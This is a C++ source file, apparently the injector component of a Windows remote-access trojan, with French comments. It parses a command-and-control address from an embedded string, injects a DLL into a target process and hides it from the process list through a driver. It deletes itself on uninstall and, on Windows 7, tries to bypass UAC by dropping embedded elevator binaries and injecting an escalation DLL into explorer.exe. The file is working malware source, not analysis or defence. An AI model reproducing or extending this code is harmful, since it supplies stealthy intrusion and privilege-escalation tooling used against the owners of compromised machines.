#include <windows.h>
#include <string>
#include <cstdlib>

#include <ElevatorDll32.hpp>
#include <ElevatorDll64.hpp>
#include <Elevator32.hpp>
#include <Elevator64.hpp>

#include "Inhibiter.hpp"
#include "ClientConfig.hpp"
#include <blaspheme/Blaspheme.hpp>
#include <common/Log.hpp>
#include <malicious/Injector.hpp>
#include <malicious/ProcessHider.hpp>
#include <malicious/BinaryRessource.hpp>
#include <system/Uac.hpp>
#include <system/ThisProcess.hpp>
#include <system/System.hpp>
#include <system/ProcessManager.hpp>
#include <system/File.hpp>

using namespace std;
using namespace System;
using namespace Network;
using namespace Inhibiter;
using namespace Malicious;

void ExecuteCommand(InhibiterCore& injector, const string& command);
void Inject(InhibiterCore& injector, const string& inhibitorPath);

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{	
    FUNC_LOG(__FUNCTION__);
	ThisProcess thisProcess;

	// le nom du programme doit apparaitre dans les messages de debug
    LOG.setHeader(thisProcess.getProgramName());
    
    // les informations de connexions vers le serveur se trouvent dans une chaine de 
    // caractere avec un certain format située dans l'exécutable
	// on va parser les infos de connexions à partir de la chaine
    /*
	string buffer = blaspheme;
    string ip_str;
    string port_str;
    buffer = buffer.substr(MARKER_SIZE, buffer.size()-2*MARKER_SIZE);
    istringstream iss(buffer);
    getline( iss, ip_str, SEPERATOR );
    getline( iss, port_str, SEPERATOR );
    Port port = 0;
    from_string(port_str, port);
    
    LOG.addObserver(new Common::LogToNetwork(ip_str, port));
	*/
	LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
    InhibiterCore injector (thisProcess.getProgramPath());
    LOG << "Program path : " + thisProcess.getProgramPath();
    LOG << "Arguments count : " + to_string(thisProcess.getArgCount());
	
    // l'injecteur a plusieurs utilités en plus d'injecter bêtement
    // la dll dans un processus, il va servir aussi a exécuter
    // certaines commandes que la DLL ne peut pas faire
    switch(thisProcess.getArgCount())
    {
        case 1:
            // Pas d'argument au programme, on doit faire une injection
            Inject(injector, thisProcess.getArg(0));
			break;
        case 2:
            // Il y a un argument, c'est une commande demandée par la DLL
            ExecuteCommand(injector, thisProcess.getArg(1));
            break;
        default:
            // Il ne peut pas y avoir plus d'un argument
            LOG << "Bad argument number";
    }
	return EXIT_SUCCESS;
}

void ExecuteCommand(InhibiterCore& injector, const string& command)
{
    FUNC_LOG(__FUNCTION__);
	if(command == UNINSTALL_CMD)
    {
		LOG << "Uninstall command";
        Sleep(1000);
        injector.uninstall();
        Malicious::DeleteMyself(INHIBITER_EXE_NAME, SELF_DELETE_CMD);
    }
    else if(command == SELF_DELETE_CMD)
    {
        LOG << "Self delete command";
        Sleep(500);
		injector.finishUninstall();
    }
    else
    {
	    LOG << "Injector installation finalizing";
        Sleep(300);
#ifndef INNOCENCE_DEBUG
		LOG << "Deleting old injector : " + command;
        if(!DeleteFile(command.c_str()))
        {
			LOG << "DeleteFile failed : " + to_string(GetLastError());
            FATAL_ERROR("Unable to delete old injector");
        }
        else
#else
		 LOG << "No program deleting in debug mode";
#endif
        {
			LOG << "Injection...";
			injector.inject();
#ifndef INNOCENCE_DEBUG
			LOG << "Hiding myself from process list";
			try
			{
				ProcessHider hider;
				hider.hide(injector.getInjectedProcess());
			}
			catch(DriverError& e)
			{
				LOG << e.what();
			}
#else
			LOG << "No process hiding in debug mode";
#endif
		}
    }
}

void Inject(InhibiterCore& injector, const string& inhibitorPath)
{
    FUNC_LOG(__FUNCTION__);
	// soit le programme est lance une premiere fois
	LOG << "Identifying operating system";
	switch(getSystemVersion())
	{
		case OS_WIN32_WINDOWS_VISTA:
			if(isUacActivated())
			{
				if(!isAdministrator())
				{
					LOG << "Privilege escalation is not supported on Windows Vista";
					return;
				}
			}
			break;
		case OS_WIN32_WINDOWS_SEVEN:
			if(isUacActivated())
			{
				if(!isAdministrator())
				{
                    string currentPath = inhibitorPath;
	                System::GetFileDir(currentPath);
					LOG << "You're not administrator, trying privilege escalation";

					BinaryRessource * elevatorDll = 0;
					BinaryRessource * elevator = 0;

					if(is64BitWindows())
					{
						elevatorDll = new BinaryRessource(ElevatorDll64, sizeof(ElevatorDll64), ELEVATOR_DLL_NAME, true);
						elevator = new BinaryRessource(Elevator64, sizeof(Elevator64), ELEVATOR_EXE_NAME, true);
					}
					else
					{
						elevatorDll = new BinaryRessource(ElevatorDll32, sizeof(ElevatorDll32), ELEVATOR_DLL_NAME, true);
						elevator = new BinaryRessource(Elevator32, sizeof(Elevator32), ELEVATOR_EXE_NAME, true);
					}

					LOG << "What is explorer.exe PID ?";
					DWORD explorer_pid = System::ProcessManager::GetPidFromName(ELEVATOR_PROCESS_NAME);
					if(explorer_pid)
					{
						LOG << "Injecting escalaion DLL in explorer.exe : " + to_string(explorer_pid);
						string elevatorArguments = currentPath+"\\"+string(ELEVATOR_PROCESS_NAME) + " " + to_string(explorer_pid) + " " + currentPath+"\\"+string(ELEVATOR_DLL_NAME) + " " + inhibitorPath;
						LOG << "Escalation command line : " + string(ELEVATOR_EXE_NAME) + " " + elevatorArguments;
						
						Process elevatorProcess(ELEVATOR_EXE_NAME, elevatorArguments);
						elevatorProcess.wait();				
					}
					else
					{
						LOG << "Process explorer does not exist, unable to inject";
					}
					delete elevatorDll;
					delete elevator;
					return;
				}
			}
		default:
			LOG << "You are administrator";
	}

	if(injector.installed())
	{
		LOG << "Injecting";
		injector.inject();
	}
	else
	{
		LOG << "Installing";
		injector.install();
	}
}
